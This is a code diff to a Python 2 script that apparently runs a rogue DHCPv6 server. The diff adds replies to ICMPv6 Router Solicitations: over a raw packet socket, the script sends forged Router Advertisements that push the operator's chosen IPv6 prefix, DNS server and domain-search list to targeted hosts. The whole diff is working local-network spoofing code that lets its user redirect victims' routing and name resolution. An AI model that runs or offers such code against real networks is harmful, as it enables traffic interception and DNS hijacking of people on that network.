@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 from base import Base
-from network import DHCPv6_raw
+from network import DHCPv6_raw, ICMPv6_raw
 from sys import exit
 from argparse import ArgumentParser
 from ipaddress import IPv6Address
@@ -42,11 +42,15 @@ if not args.quiet:
     Base.print_banner()
 
 dhcpv6 = DHCPv6_raw()
+icmpv6 = ICMPv6_raw()
 
 if args.interface is None:
     current_network_interface = Base.netiface_selection()
 else:
     current_network_interface = args.interface
+
+network_prefix = args.prefix
+dns_search = args.dns_search
 
 if args.target_mac is not None:
     target_mac_address = str(args.target_mac).lower()
@@ -78,17 +82,34 @@ if not args.quiet:
     else:
         print Base.c_info + "First suffix offer IP: " + Base.cINFO + args.first_suffix_ip + Base.cEND
         print Base.c_info + "Last suffix offer IP: " + Base.cINFO + args.last_suffix_ip + Base.cEND
-    print Base.c_info + "Prefix: " + Base.cINFO + args.prefix + Base.cEND
+    print Base.c_info + "Prefix: " + Base.cINFO + network_prefix + Base.cEND
     print Base.c_info + "Router IPv6 address: " + Base.cINFO + your_ipv6_link_address + Base.cEND
     print Base.c_info + "DNS IPv6 address: " + Base.cINFO + recursive_dns_address + Base.cEND
+    print Base.c_info + "Domain search: " + Base.cINFO + dns_search + Base.cEND
 
 
 def reply(request):
+    SOCK = socket(AF_PACKET, SOCK_RAW)
+    SOCK.bind((current_network_interface, 0))
 
     # ICMPv6 Router Solicitation
     if request.haslayer(ICMPv6ND_RS):
         print Base.c_info + "ICMPv6 Router Solicitation request from: " + request[IPv6].src + " (" + \
               request[Ether].src + ")"
+        icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
+                                                                   ethernet_dst_mac=request[Ether].src,
+                                                                   ipv6_src=your_ipv6_link_address,
+                                                                   ipv6_dst=request[IPv6].src,
+                                                                   prefix=network_prefix,
+                                                                   dns=recursive_dns_address,
+                                                                   domain_search=dns_search)
+        try:
+            SOCK.send(icmpv6_ra_packet)
+            print Base.c_info + "Send ICMPv6 Router Advertisement packet to: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ")"
+        except:
+            print Base.c_error + "Do not send ICMPv6 Router Advertisement packet to: " + request[IPv6].src + " (" + \
+                  request[Ether].src + ")"
 
     # DHCPv6 Solicit
     if request.haslayer(DHCP6_Solicit):
@@ -110,6 +131,7 @@ def reply(request):
         print Base.c_info + "DHCPv6 Confirm from: " + request[IPv6].src + " (" + \
               request[Ether].src + ")"
 
+    SOCK.close()
 
 if __name__ == "__main__":
     if args.target_ip is not None:
